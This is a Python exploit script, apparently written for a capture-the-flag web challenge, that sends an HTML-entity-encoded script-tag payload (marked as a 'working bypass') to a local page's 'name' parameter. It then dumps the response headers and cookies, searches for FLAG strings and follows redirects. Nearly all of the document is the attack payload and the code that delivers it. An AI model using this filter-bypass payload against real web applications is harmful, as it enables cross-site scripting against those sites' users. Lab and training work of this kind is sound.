import requests
import re

target = "http://127.0.0.1:32889/page"

# Working bypass payload
payload = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;alert(1)&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

print("Examining full HTTP response details...")
print("="*80)

try:
    response = requests.get(target, params={'name': payload}, timeout=5, allow_redirects=False)
    
    print(f"Status Code: {response.status_code}")
    print(f"Headers:")
    for header, value in response.headers.items():
        print(f"  {header}: {value}")
    
    print(f"\nCookies:")
    for cookie in response.cookies:
        print(f"  {cookie.name}: {cookie.value}")
    
    print(f"\nResponse Length: {len(response.content)} bytes")
    
    # Check for flags in headers or cookies
    full_response_text = str(response.headers) + str(response.cookies) + response.text
    flags = re.findall(r'FLAG\{[^}]+\}', full_response_text)
    if flags:
        print(f"\n*** FLAG FOUND: {flags[0]} ***")
    
    # Check for redirects
    if 'Location' in response.headers:
        print(f"\nRedirect to: {response.headers['Location']}")
        
        # Follow redirect
        redirect_response = requests.get(response.headers['Location'], timeout=5)
        print(f"Redirect response: {redirect_response.text[:500]}")
        
        redirect_flags = re.findall(r'FLAG\{[^}]+\}', redirect_response.text)
        if redirect_flags:
            print(f"\n*** FLAG FOUND in redirect: {redirect_flags[0]} ***")
    
except Exception as e:
    print(f"ERROR: {str(e)}")

print("\n" + "="*80)

